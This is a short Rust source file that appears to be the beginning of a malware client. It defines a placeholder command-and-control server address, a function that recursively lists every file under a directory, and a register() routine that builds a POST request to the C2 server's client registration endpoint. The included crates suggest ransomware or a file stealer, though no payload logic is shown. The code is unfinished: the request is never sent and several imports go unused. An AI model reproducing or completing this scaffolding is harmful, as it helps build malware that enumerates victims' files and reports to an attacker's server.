extern crate rand;
extern crate walkdir;

use walkdir::{WalkDir, DirEntry};
use std::fs::File;
use std::fs;
use std::io::{Read, Write};
use std::error::Error;
use std::str::{self, FromStr};
use reqwest::blocking::Request;

const C2ADDR: &str = "c2serveraddr";

fn get_all_files(dir: &str) -> Vec<String> {
    let mut file_paths = Vec::new();
    
    for entry in WalkDir::new(dir).into_iter().filter_map(|e| e.ok()) {
        if entry.file_type().is_file() {
            file_paths.push(entry.path().display().to_string());
        }
    }
    
    file_paths
}

pub fn register() -> Result<(), Box<dyn Error>> {
    let c2_register_url = format!("http://{C2ADDR}/client/register");
    let _register_reqwest = Request::new(reqwest::Method::POST, reqwest::Url::from_str(&c2_register_url)?);
    Ok(())
}
